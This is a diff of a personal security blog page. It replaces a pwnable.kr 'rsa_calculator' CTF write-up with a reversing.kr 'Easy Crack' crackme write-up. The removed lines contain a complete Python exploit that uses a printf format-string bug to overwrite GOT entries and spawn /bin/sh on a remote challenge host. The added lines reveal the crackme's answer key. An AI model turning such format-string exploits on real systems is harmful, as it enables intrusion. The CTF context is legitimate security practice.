@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="Pwnable," />
+  <meta name="keywords" content="Reversing," />
 
 
 
@@ -84,28 +84,51 @@
 
 
 
-<meta name="description" content="Conclusion这道题的bug在RSA_decrypt函数里的printf(g_pbuf)，即典型的fsb漏洞，我的利用方法是覆盖got表里的printf和putchar分别为system和fsb发生所在的地址处
-Trick
-system(junk+”/bin/sh\x00”);
+<meta name="description" content="TrickOllyDbg
+F2 : 下断点
+F7
+F8
+F9 : 执行到断点处
 
-Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
+ConclusionIDA加载程序
+
+容易发现用户函数sub_401080，其定义如下
+
+其中GetDlgItemTextA函数获取用户输入，下面的if判断语句即为Auth
+key: Ea5yR3versing">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.kr-rookiss-rsa-calculator">
-<meta property="og:url" content="http://0byjwzsf.me/2016/08/02/pwnable-rookiss-rsa-calculator/index.html">
+<meta property="og:title" content="reversing.kr-easy-crack">
+<meta property="og:url" content="http://0byjwzsf.me/2016/08/10/reversing-easy-crack/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="Conclusion这道题的bug在RSA_decrypt函数里的printf(g_pbuf)，即典型的fsb漏洞，我的利用方法是覆盖got表里的printf和putchar分别为system和fsb发生所在的地址处
-Trick
-system(junk+”/bin/sh\x00”);
+<meta property="og:description" content="TrickOllyDbg
+F2 : 下断点
+F7
+F8
+F9 : 执行到断点处
 
-Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
-<meta property="og:updated_time" content="2016-08-08T08:08:40.000Z">
+ConclusionIDA加载程序
+
+容易发现用户函数sub_401080，其定义如下
+
+其中GetDlgItemTextA函数获取用户输入，下面的if判断语句即为Auth
+key: Ea5yR3versing">
+<meta property="og:image" content="http://0byjwzsf.me/images/reversing-easy-crack/1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/reversing-easy-crack/2.jpg">
+<meta property="og:updated_time" content="2016-08-09T17:43:53.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.kr-rookiss-rsa-calculator">
-<meta name="twitter:description" content="Conclusion这道题的bug在RSA_decrypt函数里的printf(g_pbuf)，即典型的fsb漏洞，我的利用方法是覆盖got表里的printf和putchar分别为system和fsb发生所在的地址处
-Trick
-system(junk+”/bin/sh\x00”);
+<meta name="twitter:title" content="reversing.kr-easy-crack">
+<meta name="twitter:description" content="TrickOllyDbg
+F2 : 下断点
+F7
+F8
+F9 : 执行到断点处
 
-Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
+ConclusionIDA加载程序
+
+容易发现用户函数sub_401080，其定义如下
+
+其中GetDlgItemTextA函数获取用户输入，下面的if判断语句即为Auth
+key: Ea5yR3versing">
 
 
 
@@ -126,9 +149,9 @@ Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/08/02/pwnable-rookiss-rsa-calculator/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/08/10/reversing-easy-crack/"/>
 
-  <title> pwnable.kr-rookiss-rsa-calculator | Icemakr's Blog </title>
+  <title> reversing.kr-easy-crack | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -298,7 +321,7 @@ Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
             
             
               
-                pwnable.kr-rookiss-rsa-calculator
+                reversing.kr-easy-crack
               
             
           </h1>
@@ -310,8 +333,8 @@ Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-08-02T00:00:00+08:00" content="2016-08-02">
-              2016-08-02
+            <time itemprop="dateCreated" datetime="2016-08-10T00:00:00+08:00" content="2016-08-10">
+              2016-08-10
             </time>
           </span>
 
@@ -340,8 +363,8 @@ Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/08/02/pwnable-rookiss-rsa-calculator/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/02/pwnable-rookiss-rsa-calculator/" itemprop="commentsCount"></span>
+                <a href="/2016/08/10/reversing-easy-crack/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/10/reversing-easy-crack/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -364,11 +387,18 @@ Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
       
 
       
-        <h2 id="Conclusion">Conclusion</h2><p>这道题的bug在<code>RSA_decrypt</code>函数里的<code>printf(g_pbuf)</code>，即典型的<strong>fsb漏洞</strong>，我的利用方法是覆盖<strong>got表</strong>里的<code>printf</code>和<code>putchar</code>分别为<code>system</code>和fsb发生所在的地址处</p>
-<h2 id="Trick">Trick</h2><ul>
-<li>system(junk+”/bin/sh\x00”);</li>
+        <h1 id="Trick">Trick</h1><h2 id="OllyDbg">OllyDbg</h2><ul>
+<li><code>F2</code> : 下断点</li>
+<li><code>F7</code></li>
+<li><code>F8</code></li>
+<li><code>F9</code> : 执行到断点处</li>
 </ul>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./rsa_calculator'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9012</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_key</span><span class="params">(io, p, q, e, d)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'p :'</span>)</span><br><span class="line">    io.writeline(str(p))</span><br><span class="line">    io.read_until(<span class="string">'q :'</span>)</span><br><span class="line">    io.writeline(str(q))</span><br><span class="line">    io.read_until(<span class="string">'e :'</span>)</span><br><span class="line">    io.writeline(str(e))</span><br><span class="line">    io.read_until(<span class="string">'d :'</span>)</span><br><span class="line">    io.writeline(str(d))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(io, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">' : '</span>)</span><br><span class="line">    io.writeline(str(len(payload)))</span><br><span class="line">    io.read_until(<span class="string">'paste your plain text data'</span>)</span><br><span class="line">    io.writeline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(io, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">' : '</span>)</span><br><span class="line">    io.writeline(str(len(payload)))</span><br><span class="line">    io.read_until(<span class="string">'paste your hex encoded data'</span>)</span><br><span class="line">    io.writeline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = sub_egcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> g, y, x - a / b * y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sub_egcd(a,b)[<span class="number">1</span>]%b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cypher</span><span class="params">(io, plain)</span>:</span></span><br><span class="line">    encrypt(io, plain)</span><br><span class="line">    <span class="keyword">return</span> [io.read_line() <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>)][<span class="number">2</span>][<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plain</span><span class="params">(io, cypher)</span>:</span></span><br><span class="line">    decrypt(io, cypher)</span><br><span class="line">    <span class="keyword">return</span> [io.read_line() <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>)][<span class="number">2</span>][<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span></span><br><span class="line">    p = <span class="number">7</span></span><br><span class="line">    q = <span class="number">37</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    d = egcd(e, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    <span class="comment"># print 'p=%d\nq=%d\ne=%d\nd=%d\n' % (p, q, e, d)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># io = zio(target, timeout = 100000, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'yellow'))</span></span><br><span class="line">    io = zio(target, timeout = <span class="number">100000</span>, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line">    set_key(io, p, q, e, d)</span><br><span class="line"></span><br><span class="line">    plt_system  = <span class="number">0x004007c0</span></span><br><span class="line">    got_printf  = <span class="number">0x00602028</span></span><br><span class="line">    got_putchar = <span class="number">0x00602000</span></span><br><span class="line">    adr_ret     = <span class="number">0x0040122b</span></span><br><span class="line"></span><br><span class="line">    payload  = get_cypher(io, <span class="string">'%83$n%79$n%064lx%78$hn%82$hn%01920lx%77$hn%02667lx%81$hn;/bin/sh\x00'</span>)</span><br><span class="line">    payload += l64(got_printf)</span><br><span class="line">    payload += l64(got_printf + <span class="number">2</span>)</span><br><span class="line">    payload += l64(got_printf + <span class="number">4</span>)</span><br><span class="line">    payload += l64(got_printf + <span class="number">6</span>)</span><br><span class="line">    payload += l64(got_putchar)</span><br><span class="line">    payload += l64(got_putchar + <span class="number">2</span>)</span><br><span class="line">    payload += l64(got_putchar + <span class="number">4</span>)</span><br><span class="line">    payload += l64(got_putchar + <span class="number">6</span>)</span><br><span class="line">    decrypt(io, payload)</span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line">exp(target)</span><br></pre></td></tr></table></figure>
+<h1 id="Conclusion">Conclusion</h1><p>IDA加载程序</p>
+<p><img src="/images/reversing-easy-crack/1.jpg" alt=""></p>
+<p>容易发现用户函数<code>sub_401080</code>，其定义如下</p>
+<p><img src="/images/reversing-easy-crack/2.jpg" alt=""></p>
+<p>其中<code>GetDlgItemTextA</code>函数获取用户输入，下面的if判断语句即为<strong>Auth</strong></p>
+<p><strong>key: Ea5yR3versing</strong></p>
 
       
     </div>
@@ -391,7 +421,7 @@ Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
       
         <div class="post-tags">
           
-            <a href="/tags/Pwnable/" rel="tag">#Pwnable</a>
+            <a href="/tags/Reversing/" rel="tag">#Reversing</a>
           
         </div>
       
@@ -400,17 +430,13 @@ Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/31/alictf-qual-2016-vss/" rel="next" title="alictf-qual-2016-vss">
-                <i class="fa fa-chevron-left"></i> alictf-qual-2016-vss
+              <a href="/2016/08/09/pwnable-rookiss-fsb/" rel="next" title="pwnable.kr-rookiss-fsb">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-rookiss-fsb
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/08/05/pwnable-rookiss-note/" rel="prev" title="pwnable.kr-rookiss-note">
-                pwnable.kr-rookiss-note <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -542,7 +568,7 @@ Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Trick"><span class="nav-number">2.</span> <span class="nav-text">Trick</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">3.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Trick"><span class="nav-number">1.</span> <span class="nav-text">Trick</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#OllyDbg"><span class="nav-number">1.1.</span> <span class="nav-text">OllyDbg</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Conclusion"><span class="nav-number">2.</span> <span class="nav-text">Conclusion</span></a></li></ol></div>
             
           </div>
         </section>
@@ -669,9 +695,9 @@ Exploitfrom zio import *target  = &apos;./rsa_calculator&apos;targ">
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/08/02/pwnable-rookiss-rsa-calculator/';
-      var disqus_title = "pwnable.kr-rookiss-rsa-calculator";
-      var disqus_url = 'http://0byjwzsf.me/2016/08/02/pwnable-rookiss-rsa-calculator/';
+      var disqus_identifier = '2016/08/10/reversing-easy-crack/';
+      var disqus_title = "reversing.kr-easy-crack";
+      var disqus_url = 'http://0byjwzsf.me/2016/08/10/reversing-easy-crack/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
